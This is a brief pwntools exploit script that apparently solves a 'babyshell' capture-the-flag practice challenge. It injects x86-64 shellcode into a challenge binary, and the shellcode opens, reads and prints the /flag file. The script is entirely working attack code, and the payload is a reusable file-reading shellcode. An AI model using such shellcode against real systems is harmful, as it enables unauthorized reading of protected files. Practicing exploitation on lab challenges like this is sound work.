from pwn import *

context.update(arch="x86-64", encoding="latin")

binary = glob.glob("/challenge/babyshell_level*")[1]

flag = b'/flag\0'[::-1].hex()

shellcode = (f'''

    mov rax, 0x{flag}
    push rax

    mov rdi, rsp
    mov rsi, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 1000
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall

    mov rdi, 42
    mov rax, 60
    syscall
''')
shellcode = asm(shellcode)

with process([binary]) as p:
    p.readuntilS("Reading 0x1000 bytes from stdin.")
    p.write(shellcode)
    print(p.readallS())